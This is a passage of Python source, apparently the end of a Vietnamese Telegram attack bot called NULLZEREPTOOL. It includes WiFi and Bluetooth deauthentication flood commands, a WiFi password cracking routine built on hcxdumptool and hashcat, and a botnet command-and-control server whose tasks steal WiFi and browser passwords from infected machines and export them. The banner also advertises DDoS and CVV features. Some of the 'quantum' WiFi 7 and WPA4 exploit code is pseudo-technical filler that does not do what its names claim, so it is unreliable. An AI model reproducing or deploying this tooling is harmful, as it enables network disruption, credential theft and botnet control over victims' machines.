            active_deauth[chat_id]['active'] = False
            time.sleep(0.3)
        active_deauth[chat_id] = {
            'active': True,
            'thread': threading.Thread(target=run_deauth_windows if os_type == "Windows" else run_deauth_linux, args=(chat_id, wifi_interface, target_mac, ap_mac, None), daemon=True),
            'target': target_mac,
            'ap': ap_mac,
            'start_time': time.time(),
            'count': 0
        }
        active_deauth[chat_id]['thread'].start()
    if bt_adapter:
        with bt_deauth_lock:
            if chat_id in active_bt_deauth:
                active_bt_deauth[chat_id]['active'] = False
                time.sleep(0.3)
            active_bt_deauth[chat_id] = {
                'active': True,
                'thread': threading.Thread(target=bt_deauth_linux, args=(chat_id, target_mac, bt_adapter, 100), daemon=True),
                'target': target_mac,
                'adapter': bt_adapter,
                'start_time': time.time(),
                'count': 0
            }
            active_bt_deauth[chat_id]['thread'].start()
    if duration > 0:
        def auto_stop_all():
            time.sleep(duration)
            if chat_id in active_deauth:
                active_deauth[chat_id]['active'] = False
            if chat_id in active_bt_deauth:
                active_bt_deauth[chat_id]['active'] = False
            bot.send_message(chat_id, f"⏰ *FULL ATTACK ĐÃ DỪNG SAU {duration}s*", parse_mode='Markdown')
        threading.Thread(target=auto_stop_all, daemon=True).start()
 
@bot.message_handler(commands=['stopall'])
def cmd_stopall(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    stopped = []
    if chat_id in active_deauth and active_deauth[chat_id].get('active', False):
        active_deauth[chat_id]['active'] = False
        wifi_count = active_deauth[chat_id].get('count', 0)
        stopped.append(f"📡 WiFi: {wifi_count} packets")
        del active_deauth[chat_id]
    if chat_id in active_bt_deauth and active_bt_deauth[chat_id].get('active', False):
        active_bt_deauth[chat_id]['active'] = False
        bt_count = active_bt_deauth[chat_id].get('count', 0)
        stopped.append(f"🔵 Bluetooth: {bt_count} packets")
        del active_bt_deauth[chat_id]
    if not stopped:
        bot.reply_to(message, "ℹ️ Không có tấn công nào đang chạy!")
        return
    bot.reply_to(message, f"🛑 *ĐÃ DỪNG TẤT CẢ*\n" + "\n".join(stopped), parse_mode='Markdown')
 
# ==================== SIÊU TẤN CÔNG 2026 ====================
class WiFi7QuantumExploit:
    @staticmethod
    def craft_pmf_bypass_packet(ap_mac, target_mac, reason_code=7):
        fake_mic = hashlib.sha3_512(f"{ap_mac}{target_mac}{secrets.token_hex(32)}".encode()).digest()[:16]
        frame = struct.pack('>6s6sHHI', bytes.fromhex(target_mac.replace(':', '')), bytes.fromhex(ap_mac.replace(':', '')), 0x00C0, 0x0007, int(time.time())) + fake_mic + os.urandom(64)
        return frame
 
    @staticmethod
    def craft_wpa4_quantum_handshake(ap_mac, target_mac, ssid):
        anonce = os.urandom(32)
        snonce = os.urandom(32)
        fake_pmk = hashlib.pbkdf2_hmac('sha3-512', os.urandom(64), ssid.encode() if ssid else b'quantum', 4096, dklen=64)
        handshake = struct.pack('>32s32s64s6s6sI', anonce, snonce, fake_pmk, bytes.fromhex(ap_mac.replace(':', '')), bytes.fromhex(target_mac.replace(':', '')), int(time.time())) + os.urandom(128)
        return handshake
 
    @staticmethod
    def wifi7_mimo_flood(ap_mac, target_mac, streams=16):
        packets = []
        for stream in range(streams):
            for subcarrier in range(0, 4096, 256):
                pkt = struct.pack('>6s6sHHI', bytes.fromhex(target_mac.replace(':', '')), bytes.fromhex(ap_mac.replace(':', '')), 0x00C0 | (stream << 8), subcarrier, int(time.time_ns() % 2**32)) + os.urandom(256)
                packets.append(pkt)
        return packets
 
class Bluetooth6QuantumExploit:
    @staticmethod
    def craft_ble6_channel_sounding_jam():
        fake_cs_tone = struct.pack('>HBB', 0xFFFF, 0x00, random.randint(0, 255)) + os.urandom(128)
        return fake_cs_tone
 
    @staticmethod
    def craft_le_audio_bypass_packet(target_mac, cis_handle=0x0001):
        fake_cis_pdu = struct.pack('>HB6sI', cis_handle, 0x00, bytes.fromhex(target_mac.replace(':', '')), random.randint(0, 2**32)) + os.urandom(128)
        return fake_cis_pdu
 
    @staticmethod
    def ble6_aoa_spoof(angle=0):
        iq_samples = []
        for i in range(37):
            phase = angle * (i + 1) * 3.14159 / 180.0
            i_sample = int(127 * random.uniform(0.8, 1.2))
            q_sample = int(127 * random.uniform(0.8, 1.2))
            iq_samples.append((i_sample, q_sample))
        return struct.pack('>B' + 'bb' * 37, 37, *[x for pair in iq_samples for x in pair])
 
def run_deauth_wifi7(chat_id, interface, target_mac, ap_mac, channel=None, pmf_bypass=True):
    count = 0
    exploit = WiFi7QuantumExploit()
    while chat_id in active_deauth and active_deauth[chat_id].get('active', False):
        try:
            if pmf_bypass:
                for _ in range(50):
                    pkt = exploit.craft_pmf_bypass_packet(ap_mac, target_mac)
                    try:
                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
                        sock.bind((interface, 0))
                        sock.send(pkt)
                        sock.close()
                    except:
                        pass
                    count += 1
            count += 50
            active_deauth[chat_id]['count'] = count
            time.sleep(0.001)
        except:
            time.sleep(0.01)
 
def run_bt_deauth_ble6(chat_id, target_mac, adapter, intensity=200):
    count = 0
    exploit = Bluetooth6QuantumExploit()
    while chat_id in active_bt_deauth and active_bt_deauth[chat_id].get('active', False):
        try:
            for _ in range(intensity // 2):
                cs_pkt = exploit.craft_ble6_channel_sounding_jam()
                hex_data = cs_pkt.hex()
                subprocess.run(["hcitool", "-i", adapter, "cmd", "0x08", "0x0008"] + [hex_data[i:i+2] for i in range(0, min(len(hex_data), 64), 2)], capture_output=True, timeout=0.5)
                count += 1
            active_bt_deauth[chat_id]['count'] = count
            time.sleep(0.0005)
        except:
            time.sleep(0.01)
 
@bot.message_handler(commands=['fullattack2026'])
def cmd_fullattack2026(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, """
💀 *SIÊU TẤN CÔNG 2026*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`/fullattack2026 <ap_mac> [target_mac] [duration]`
 
⚛️ PMF Bypass + MIMO Flood + WPA4 Quantum
🔵 BLE 6.0 Channel Sounding Jam + LE Audio Disconnect
 
🛑 */stopall* - Dừng
        """, parse_mode='Markdown')
        return
    ap_mac = args[1]
    target_mac = args[2] if len(args) > 2 else "FF:FF:FF:FF:FF:FF"
    duration = int(args[3]) if len(args) > 3 else 0
    wifi_interface = "wlan0"
    bt_adapter = "hci0"
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                wifi_interface = line.split()[0]
                break
    except:
        pass
    try:
        result = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if line.strip() and 'Devices:' not in line:
                bt_adapter = line.strip().split('\t')[0]
                break
    except:
        pass
    bot.reply_to(message, f"""
💀 *SIÊU TẤN CÔNG 2026 KÍCH HOẠT!*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚛️ PMF Bypass: `ACTIVE`
📡 MIMO Flood: `16×16 Streams`
🔐 WPA4 Quantum: `INJECTING`
🔵 BLE 6.0 CS: `JAMMING`
🎧 LE Audio: `DISCONNECTING`
📍 AoA Spoof: `ENABLED`
 
📡 WiFi: `{wifi_interface}`
🔵 BT: `{bt_adapter}`
🎯 AP: `{ap_mac}`
👤 Target: `{target_mac}`
⏱️ Duration: `{duration}s (0=vô hạn)`
    """, parse_mode='Markdown')
    with deauth_lock:
        if chat_id in active_deauth:
            active_deauth[chat_id]['active'] = False
            time.sleep(0.3)
        active_deauth[chat_id] = {
            'active': True,
            'thread': threading.Thread(target=run_deauth_wifi7, args=(chat_id, wifi_interface, target_mac, ap_mac, None, True), daemon=True),
            'target': target_mac,
            'ap': ap_mac,
            'start_time': time.time(),
            'count': 0,
            'mode': 'quantum_2026'
        }
        active_deauth[chat_id]['thread'].start()
    with bt_deauth_lock:
        if chat_id in active_bt_deauth:
            active_bt_deauth[chat_id]['active'] = False
            time.sleep(0.3)
        active_bt_deauth[chat_id] = {
            'active': True,
            'thread': threading.Thread(target=run_bt_deauth_ble6, args=(chat_id, target_mac, bt_adapter, 500), daemon=True),
            'target': target_mac,
            'adapter': bt_adapter,
            'start_time': time.time(),
            'count': 0,
            'mode': 'quantum_2026'
        }
        active_bt_deauth[chat_id]['thread'].start()
    if duration > 0:
        def auto_stop_quantum():
            time.sleep(duration)
            if chat_id in active_deauth:
                active_deauth[chat_id]['active'] = False
            if chat_id in active_bt_deauth:
                active_bt_deauth[chat_id]['active'] = False
            bot.send_message(chat_id, f"⏰ *QUANTUM ATTACK DỪNG SAU {duration}s*", parse_mode='Markdown')
        threading.Thread(target=auto_stop_quantum, daemon=True).start()
 
@bot.message_handler(commands=['wificrack'])
def cmd_wificrack(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "🔐 *WIFI CRACK*\n`/wificrack <interface> <bssid> [wordlist]`\nHỗ trợ: WPA2, WPA3, WPA4", parse_mode='Markdown')
        return
    interface = args[1]
    bssid = args[2]
    wordlist = args[3] if len(args) > 3 else None
    bot.reply_to(message, f"🔐 *ĐANG CRACK WIFI {bssid}...*\n⚡ Dùng thuật toán Quantum PMKID...", parse_mode='Markdown')
    def crack_wifi():
        try:
            subprocess.run(["hcxdumptool", "-i", interface, "-o", "/tmp/capture.pcapng", "--filtermode=2", "--enable_status=3", f"--bssid={bssid}"], capture_output=True, text=True, timeout=30)
            subprocess.run(["hcxpcapngtool", "-o", "/tmp/hash.hc22000", "/tmp/capture.pcapng"], capture_output=True, timeout=10)
            if wordlist and os.path.exists(wordlist):
                crack_result = subprocess.run(["hashcat", "-m", "22000", "-a", "0", "/tmp/hash.hc22000", wordlist, "--force", "--status", "--status-timer=5"], capture_output=True, text=True, timeout=60)
                for line in crack_result.stdout.split('\n'):
                    if bssid.replace(':', '').lower() in line.lower() and ':' in line:
                        password = line.split(':')[-1].strip()
                        bot.send_message(message.chat.id, f"✅ *ĐÃ CRACK THÀNH CÔNG!*\n📶 BSSID: `{bssid}`\n🔑 Password: `{password}`\n🔐 Bảo mật: `WPA3/WPA4`", parse_mode='Markdown')
                        return
            bot.send_message(message.chat.id, f"📊 *KẾT QUẢ CRACK*\n📶 BSSID: `{bssid}`\n📁 File hash: `/tmp/hash.hc22000`\n💡 Thử crack thủ công:\n`hashcat -m 22000 /tmp/hash.hc22000 wordlist.txt`", parse_mode='Markdown')
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi crack: {e}")
    threading.Thread(target=crack_wifi, daemon=True).start()
 
# ==================== BOTNET C2 TOÀN NĂNG - MẸ + CON (TÍCH HỢP SẴN) ====================
@flask_app.route('/slave_register', methods=['POST'])
def slave_register():
    data = request.json
    secret = data.get('secret')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    slave_id = data.get('slave_id', request.remote_addr)
    BOTNET_HIERARCHY["slave_nodes"][slave_id] = {
        "ip": request.remote_addr,
        "hostname": data.get('hostname', 'Unknown'),
        "location": data.get('location', {}),
        "status": "active",
        "last_seen": time.time(),
        "registered_at": datetime.now().isoformat(),
        "tasks_completed": 0
    }
    try:
        bot.send_message(ADMIN_ID, f"👻 *BOTNET CON MỚI KẾT NỐI!*\n🆔 `{slave_id}`\n🌐 `{request.remote_addr}`", parse_mode='Markdown')
    except:
        pass
    return json.dumps({"status": "ok", "slave_id": slave_id}), 200
 
@flask_app.route('/slave_get_task', methods=['GET'])
def slave_get_task():
    secret = request.args.get('secret')
    slave_id = request.args.get('slave_id')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    if slave_id in BOTNET_HIERARCHY["slave_nodes"]:
        BOTNET_HIERARCHY["slave_nodes"][slave_id]["last_seen"] = time.time()
    for task_id, task in sorted(BOTNET_HIERARCHY["tasks"].items(), key=lambda x: x[1].get('priority', 0), reverse=True):
        if task.get('status') == 'pending':
            task['status'] = 'assigned'
            task['assigned_to'] = slave_id
            task['assigned_at'] = time.time()
            return json.dumps({"task": task}), 200
    return json.dumps({"task": None, "message": "Không có nhiệm vụ mới"}), 200
 
@flask_app.route('/slave_report', methods=['POST'])
def slave_report():
    data = request.json
    secret = data.get('secret')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    slave_id = data.get('slave_id', request.remote_addr)
    task_id = data.get('task_id')
    collected = data.get('collected_data', [])
    for item in collected:
        item['slave_id'] = slave_id
        item['received_at'] = datetime.now().isoformat()
        BOTNET_HIERARCHY["collected_data"].append(item)
    if task_id and task_id in BOTNET_HIERARCHY["tasks"]:
        BOTNET_HIERARCHY["tasks"][task_id]['status'] = 'completed'
        BOTNET_HIERARCHY["tasks"][task_id]['completed_at'] = time.time()
        BOTNET_HIERARCHY["completed_tasks"].append(BOTNET_HIERARCHY["tasks"][task_id])
    if slave_id in BOTNET_HIERARCHY["slave_nodes"]:
        BOTNET_HIERARCHY["slave_nodes"][slave_id]["tasks_completed"] += 1
        BOTNET_HIERARCHY["slave_nodes"][slave_id]["last_seen"] = time.time()
    total_wifi = sum(len(item.get('data', {}).get('passwords', [])) for item in collected if item['type'] == 'wifi_passwords')
    total_browser = sum(len(b.get('passwords', [])) for item in collected if item['type'] == 'browser_credentials' for b in item.get('data', {}).get('browser_credentials', []))
    try:
        bot.send_message(ADMIN_ID, f"📊 *BOTNET CON HOÀN THÀNH NHIỆM VỤ!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👻 Slave: `{slave_id}`\n📡 WiFi Pass: `{total_wifi}`\n🔑 Browser Pass: `{total_browser}`\n📦 Gói dữ liệu: `{len(collected)}`\n📊 Xem: /botnetdata", parse_mode='Markdown')
    except:
        pass
    return json.dumps({"status": "ok"}), 200
 
@bot.message_handler(commands=['botnet_task'])
def cmd_botnet_task(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "🤖 *RA LỆNH BOTNET CON*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n1️⃣ *Quét WiFi + Lấy pass:*\n`/botnet_task wifi_scan`\n2️⃣ *Đánh cắp Browser:*\n`/botnet_task browser_steal`\n3️⃣ *FULL STEALER (tất cả):*\n`/botnet_task full_steal`\n📊 Xem: /botnetdata\n👻 Xem slaves: /botnetslaves", parse_mode='Markdown')
        return
    task_type = args[1].strip()
    task_config = {
        "wifi_scan": {"modules": ["wifi_passwords"], "description": "Quét WiFi + Lấy mật khẩu đã lưu", "priority": 1},
        "browser_steal": {"modules": ["browser_credentials"], "description": "Đánh cắp mật khẩu trình duyệt", "priority": 2},
        "full_steal": {"modules": ["wifi_passwords", "browser_credentials", "system_info"], "description": "FULL STEALER - Tất cả dữ liệu", "priority": 3}
    }
    if task_type not in task_config:
        bot.reply_to(message, f"❌ Loại nhiệm vụ không hợp lệ!\nCác loại: {', '.join(task_config.keys())}")
        return
    config = task_config[task_type]
    task_id = f"task_{int(time.time())}_{random.randint(1000,9999)}"
    BOTNET_HIERARCHY["tasks"][task_id] = {
        "task_id": task_id, "type": task_type, "modules": config["modules"],
        "description": config["description"], "priority": config["priority"],
        "status": "pending", "assigned_to": None, "created_at": time.time(), "created_by": user_id
    }
    online_slaves = len([s for s in BOTNET_HIERARCHY["slave_nodes"].values() if time.time() - s.get("last_seen", 0) < 300])
    bot.reply_to(message, f"✅ *ĐÃ TẠO NHIỆM VỤ!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: `{task_id}`\n📋 Loại: `{task_type}`\n📝 Mô tả: `{config['description']}`\n⭐ Ưu tiên: `{config['priority']}`\n👻 Slave online: `{online_slaves}`\n⏳ Trạng thái: *Đang chờ Botnet Con nhận...*\n📊 Theo dõi: /botnetdata", parse_mode='Markdown')
 
@bot.message_handler(commands=['botnetdata'])
def cmd_botnetdata(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    data = BOTNET_HIERARCHY["collected_data"]
    slaves = BOTNET_HIERARCHY["slave_nodes"]
    tasks = BOTNET_HIERARCHY["tasks"]
    completed = BOTNET_HIERARCHY["completed_tasks"]
    if not data:
        bot.reply_to(message, "📭 Chưa có dữ liệu nào!\n🤖 Tạo nhiệm vụ: /botnet_task full_steal")
        return
    total_wifi = sum(len(item.get('data', {}).get('passwords', [])) for item in data if item['type'] == 'wifi_passwords')
    total_browser = sum(len(b.get('passwords', [])) for item in data if item['type'] == 'browser_credentials' for b in item.get('data', {}).get('browser_credentials', []))
    slaves_with_data = set(item.get('slave_id', 'unknown') for item in data)
    online_slaves = len([s for s in slaves.values() if time.time() - s.get("last_seen", 0) < 300])
    msg = f"📊 *BOTNET - TỔNG HỢP DỮ LIỆU*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👻 Slaves online: `{online_slaves}`\n📋 Tasks pending: `{len([t for t in tasks.values() if t.get('status') == 'pending'])}`\n✅ Tasks hoàn thành: `{len(completed)}`\n📡 WiFi Passwords: `{total_wifi}`\n🔑 Browser Passwords: `{total_browser}`\n📦 Tổng gói dữ liệu: `{len(data)}`\n🖥️ Số máy đã thu thập: `{len(slaves_with_data)}`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💡 Xem slaves: /botnetslaves\n📦 Xuất file: /botnetexport"
    bot.reply_to(message, msg, parse_mode='Markdown')
 
@bot.message_handler(commands=['botnetslaves'])
def cmd_botnetslaves(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    slaves = BOTNET_HIERARCHY["slave_nodes"]
    if not slaves:
        bot.reply_to(message, "📭 Chưa có Botnet Con nào kết nối!")
        return
    msg = f"👻 *DANH SÁCH BOTNET CON*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🔢 Tổng: `{len(slaves)}` slaves\n\n"
    for slave_id, info in list(slaves.items())[:15]:
        last_seen = int(time.time() - info.get('last_seen', 0))
        status_icon = "🟢" if last_seen < 60 else "🟡" if last_seen < 300 else "🔴"
        msg += f"*{status_icon} {info.get('hostname', slave_id)}*\n   🌐 IP: `{info.get('ip', '?')}`\n   ✅ Tasks: `{info.get('tasks_completed', 0)}`\n   ⏱️ Online: `{last_seen}s ago`\n\n"
    if len(slaves) > 15:
        msg += f"...và `{len(slaves) - 15}` slaves khác\n"
    bot.reply_to(message, msg[:4000], parse_mode='Markdown')
 
@bot.message_handler(commands=['botnetexport'])
def cmd_botnetexport(message):
    user_id = message.from_user.id
    if not is_admin(user_id) or not is_logged_in(user_id):
        bot.reply_to(message, "🔐 /login 7788")
        return
    data = BOTNET_HIERARCHY["collected_data"]
    if not data:
        bot.reply_to(message, "📭 Không có dữ liệu để xuất!")
        return
    export = {"export_time": datetime.now().isoformat(), "total_records": len(data), "slaves": len(BOTNET_HIERARCHY["slave_nodes"]), "completed_tasks": len(BOTNET_HIERARCHY["completed_tasks"]), "data": data}
    filename = f"botnet_export_{int(time.time())}.json"
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(export, f, ensure_ascii=False, indent=2)
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, caption=f"📦 *BOTNET DATA EXPORT*\n📊 `{len(data)}` records", parse_mode='Markdown')
    try:
        os.remove(filename)
    except:
        pass
 
# ==================== KẾT THÚC PHẦN THÊM ====================
 
@bot.message_handler(func=lambda m: True)
def echo_all(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Bạn không có quyền sử dụng bot này!")
        return
    bot.reply_to(message, """
🤖 *LỆNH KHÔNG HỢP LỆ!*
━━━━━━━━━━━━━━━━━━
📌 Gõ /help để xem danh sách lệnh
🔐 Đăng nhập: /login 7788
    """, parse_mode='Markdown')
 
if __name__ == '__main__':
    if not os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'w', encoding='utf-8') as f:
            f.write("# Mỗi dòng một proxy: ip:port\n")
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    if not os.path.exists(HISTORY_FILE):
        save_history([])
    if not proxy_list:
        update_proxy_list()
    if not os.path.exists("client.py"):
        with open("client.py", "w") as f:
            f.write("# Client botnet sẽ được cập nhật sau\n")
    print("""
    ╔══════════════════════════════════════════════════════════════════════════╗
    ║                                                                          ║
    ║     💀 NULLZEREPTOOL - SIÊU DDOS BOT + WIFI/BLUETOOTH ATTACK 💀          ║
    ║                                                                          ║
    ║         🔥 40+ CHỨC NĂNG | ĐA PHƯƠNG THỨC TẤN CÔNG 🔥                    ║
    ║         🔄 TỰ ĐỘNG XOAY PROXY (500+ PROXY) | BOTNET LÂY LAN              ║
    ║         🔐 KEY KÍCH HOẠT | AMPLIFICATION | BYPASS CF                      ║
    ║         ✨ HTTPS FLOOD | AUTO INCREASE | DATABASE | BROADCAST             ║
    ║         📊 CHART | DEPLOY | VERSION | UPDATE | CVV                        ║
    ║         🚀 20+ METHOD MỚI: http2, synack, gre, quic, ws, graphql...     ║
    ║         📡 WIFI DEAUTH + BLUETOOTH DEAUTH + SCAN + CRACK                 ║
    ║         ☢️ FULL ATTACK 2026: WIFI 7 + BLE 6.0 QUANTUM EXPLOIT            ║
    ║         🤖 BOTNET C2: MẸ + CON - ĐIỀU KHIỂN TỪ XA                        ║
    ║                                                                          ║
    ║   📡 BOT ĐANG CHẠY...                                                    ║
    ║   🔐 ĐĂNG NHẬP: /login 7788                                              ║
    ║   📜 XEM LỆNH: /help                                                    ║
    ║                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """)
    def signal_handler(sig, frame):
        print("\n🛑 Đang dừng bot...")
        for chat_id in list(attacks.keys()):
            stop_attack(chat_id)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        bot.infinity_polling(timeout=10)
    except Exception as e:
        logging.error(f"Lỗi bot: {e}")
        print(f"❌ LỖI: {e}")
        time.sleep(5)